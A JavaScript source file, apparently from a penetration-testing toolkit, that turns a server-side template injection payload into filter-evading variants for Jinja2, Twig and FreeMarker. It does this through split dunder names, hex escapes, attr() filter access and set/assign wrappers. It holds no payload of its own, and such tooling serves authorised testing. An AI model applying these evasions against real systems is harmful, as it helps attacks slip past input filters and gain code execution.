/** Target-aware SSTI transformation engine. */

import { hexEscape } from '../utils/encoding.js'
import { finalizeVariants } from '../utils/variants.js'

function detectTemplateParts(payload) {
  const expression = payload.match(/\{\{([\s\S]*?)\}\}/)
  const block = payload.match(/\{%([\s\S]*?)%\}/)
  const freemarker = payload.match(/\$\{([\s\S]*?)\}/)
  return {
    expression: expression?.[1].trim() ?? null,
    block: block?.[1].trim() ?? null,
    freemarker: freemarker?.[1].trim() ?? null,
  }
}
function splitDunder(dunder, operator) {
  const inner = dunder.slice(2, -2)
  const middle = Math.max(1, Math.floor(inner.length / 2))
  return `'__${inner.slice(0, middle)}'${operator}'${inner.slice(middle)}__'`
}

function replaceDunderAccess(payload, replacement) {
  return payload.replace(/\.(__[A-Za-z0-9_]+__)|\[\s*(['"])(__[A-Za-z0-9_]+__)\2\s*\]/g, (_match, dotted, _quote, bracketed) => {
    return replacement(dotted ?? bracketed)
  })
}

function applyStringConcat(payload, target) {
  if (target !== 'jinja2' && target !== 'twig') return []
  const operator = target === 'jinja2' ? '+' : '~'
  const alternativeOperator = '~'
  const first = replaceDunderAccess(payload, (dunder) => `[${splitDunder(dunder, operator)}]`)
  const second = replaceDunderAccess(payload, (dunder) => `[(${splitDunder(dunder, alternativeOperator)})]`)
  return [first, second].filter((variant) => variant !== payload)
}

function applyHexEncoding(payload, target) {
  if (target !== 'jinja2' && target !== 'twig') return []
  const transformed = replaceDunderAccess(payload, (dunder) => `['${hexEscape(dunder)}']`)
  return transformed === payload ? [] : [transformed]
}

function applyAttrAccess(payload, target) {
  if (target !== 'jinja2') return []
  const plain = replaceDunderAccess(payload, (dunder) => `|attr('${dunder}')`)
  const encoded = replaceDunderAccess(payload, (dunder) => `|attr('${hexEscape(dunder)}')`)
  return [plain, encoded].filter((variant) => variant !== payload)
}

function applyFilterBypass(payload, target) {
  const { expression, freemarker } = detectTemplateParts(payload)
  if ((target === 'jinja2' || target === 'twig') && expression) {
    return [
      `{% set result = ${expression} %}{{ result }}`,
      `{%- set result = ${expression} -%}{{- result -}}`,
    ]
  }
  if (target === 'freemarker' && freemarker) {
    return [
      `<#assign result = ${freemarker}>\${result}`,
      `[#assign result = ${freemarker}]\${result}`,
    ]
  }
  return []
}

export function generateSstiVariants(payload, layers, target) {
  if (!payload || !payload.trim()) return []

  const allVariants = [{ payload, label: 'Original', layers: [] }]
  const add = (values, label, layer) => values.forEach((value) => {
    allVariants.push({ payload: value, label, layers: [layer], validity: 'conditional' })
  })

  if (layers.includes('string-concat')) add(applyStringConcat(payload, target), 'String Concat', 'string-concat')
  if (layers.includes('hex-encoding')) add(applyHexEncoding(payload, target), 'Hex Encoding', 'hex-encoding')
  if (layers.includes('attr-access')) add(applyAttrAccess(payload, target), 'Attribute Access', 'attr-access')
  if (layers.includes('filter-bypass')) add(applyFilterBypass(payload, target), 'Set/Whitespace Bypass', 'filter-bypass')

  return finalizeVariants(allVariants, layers)
}
